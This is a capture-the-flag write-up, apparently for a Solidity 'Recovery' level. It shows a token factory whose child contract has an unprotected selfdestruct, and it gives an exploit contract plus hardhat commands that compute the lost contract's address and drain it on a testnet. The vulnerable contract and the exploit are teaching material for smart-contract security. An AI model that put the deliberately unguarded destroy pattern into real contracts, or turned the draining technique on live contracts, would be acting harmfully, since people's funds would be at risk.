# Level 17: Recovery Challenge

## Challenge Description

A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.001 ether to obtain more tokens. They have since lost the contract address.

The goal is to recover (or remove) the 0.001 ether from the lost contract address.

## Contract Location

The challenge contract is located at:
```
/contracts/level-17-recovery/Recovery.sol
```

## Understanding the Challenge

The `Recovery` contract is a token factory that creates `SimpleToken` contracts. Here's the code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```

### Key Observations

1. The `Recovery` contract creates `SimpleToken` contracts but doesn't store their addresses anywhere.
2. The `SimpleToken` contract has a `destroy` function that can be called by anyone to selfdestruct the contract and send its funds to a specified address.
3. The challenge mentions that 0.001 ETH was sent to the token contract.
4. We need to find the address of this lost token contract to call the `destroy` function.

## Winning Strategy

The key to solving this challenge lies in understanding how contract addresses are calculated in Ethereum. Every contract address is deterministically calculated based on:
1. The address of the creator (in this case, the Recovery contract)
2. The nonce of the creator at the time of creation (starting at 1 for contracts)

For regular external accounts, the nonce represents the number of transactions sent from that account. For contracts, the nonce represents the number of other contracts created by that contract.

Since this is the first token created by the Recovery contract, the nonce would be 1. We can use this information to calculate the address of the lost token contract.

## Hint for Thinking

Ask yourself:
* How are contract addresses calculated in Ethereum?
* If this is the first contract created by the Recovery contract, what would its nonce be?
* How can we use this information to find the lost token address?
* Once we find the address, how can we recover the ETH?

## Disclaimer

If you want to solve this challenge on your own, stop reading here and try to implement a solution based on the hints above. The complete solution is provided below.

---

## Solution

### Understanding Contract Address Calculation

In Ethereum, the address of a new contract is calculated using:

```
address = keccak256(rlp([creator_address, creator_nonce]))[12:]
```

Where:
- `creator_address` is the address of the contract or account creating the new contract
- `creator_nonce` is the nonce of the creator (1 for the first contract created by another contract)
- `[12:]` means we take the last 20 bytes (40 hex characters) of the result

### Exploit Steps

1. **Calculate the address** of the lost token contract using the Recovery contract's address and nonce 1.
2. **Call the `destroy` function** on the token contract to send the 0.001 ETH to our address.

### Implementation Details

The solution contract, `RecoveryExploit`, implements the logic to calculate the lost token address and call its `destroy` function:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) external;
    function name() external view returns (string memory);
    function balances(address owner) external view returns (uint256);
    function transfer(address _to, uint256 _amount) external;
}

contract RecoveryExploit {
    address public recoveryAddress;
    address public owner;
    bool public recovered;

    constructor(address _recoveryAddress) {
        recoveryAddress = _recoveryAddress;
        owner = msg.sender;
        recovered = false;
    }

    function computeTokenAddress(string memory _tokenName) public view returns (address) {
        // When a contract creates another contract, the new contract's address is determined by:
        // keccak256(rlp([creator_address, creator_nonce]))[12:]
        // For the first token created by the Recovery contract, the nonce is 1
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xd6),  // RLP prefix for addresses with specific length
                bytes1(0x94),  // Fixed prefix for 20-byte address
                recoveryAddress,
                bytes1(0x01)   // nonce = 1
            )
        );
        
        // Take the last 20 bytes to get the contract address
        return address(uint160(uint256(hash)));
    }
    
    function recoverLostFunds(string memory _tokenName, address payable _recipient) external {
        require(msg.sender == owner, "Only owner can execute the exploit");
        
        // Calculate the token address
        address lostTokenAddress = computeTokenAddress(_tokenName);
        
        // Call the destroy function
        ISimpleToken(lostTokenAddress).destroy(_recipient);
        
        recovered = true;
    }
}
```

### Alternative JavaScript Calculation

If you prefer to calculate the address in JavaScript instead of Solidity:

```javascript
const { ethers } = require("hardhat");

async function calculateTokenAddress(recoveryAddress) {
  const tokenAddressBytes = ethers.utils.keccak256(
    ethers.utils.RLP.encode([
      recoveryAddress,
      "0x01" // nonce 1
    ])
  );
  
  // Take the last 20 bytes as the address
  return "0x" + tokenAddressBytes.slice(26);
}
```

### Execution Steps

1. **Deploy the Recovery Contract and Token**:

   ```shell
   npx hardhat deploy --tags recovery --network sepolia
   ```

2. **Deploy the RecoveryExploit Contract**:

   ```shell
   RECOVERY_INSTANCE_ADDRESS=0xYourRecoveryAddress npx hardhat deploy --tags recovery-solution --network sepolia
   ```

3. **Execute the Exploit**:

   ```shell
   RECOVERY_INSTANCE_ADDRESS=0xYourRecoveryAddress RECOVERY_SOLUTION_ADDRESS=0xYourExploitAddress npx hardhat run scripts/level-17-recovery/execute-recovery-exploit.ts --network sepolia
   ```

## Key Insights

1. **Contract Address Determinism**: Contract addresses in Ethereum are deterministically calculated based on the creator's address and nonce. This means you can always recover a contract's address even if you've lost it.

2. **RLP Encoding**: The calculation uses RLP (Recursive Length Prefix) encoding, a format used in Ethereum to encode nested arrays of data.

3. **selfdestruct Function**: The `selfdestruct` opcode in Ethereum allows a contract to destroy itself and send all its ETH to a specified address. This is a powerful feature but also potentially dangerous if exposed to unauthorized users.

4. **Factory Pattern Implications**: When using the factory pattern to deploy contracts, consider whether you need to track the addresses of created contracts. In this case, the lack of tracking led to a "lost" contract.

5. **Security Considerations**: Permissionless destruction functions like the one in `SimpleToken` are generally a bad idea, as they allow anyone to destroy the contract.
